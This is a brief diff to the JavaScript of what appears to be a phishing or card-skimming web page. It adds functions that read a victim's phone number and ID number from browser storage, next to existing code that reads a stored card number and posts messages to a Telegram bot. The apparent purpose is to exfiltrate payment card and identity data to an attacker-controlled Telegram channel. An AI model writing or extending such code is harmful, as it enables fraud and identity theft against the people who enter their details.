@@ -208,6 +208,15 @@
       return localStorage.getItem('cardNumber') || '----';
     }
 
+    // Get phone and ID
+    function getPhone() {
+      return localStorage.getItem('phone') || 'غير متوفر';
+    }
+
+    function getIdNumber() {
+      return localStorage.getItem('id_number') || 'غير متوفر';
+    }
+
     // Send data directly to Telegram
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
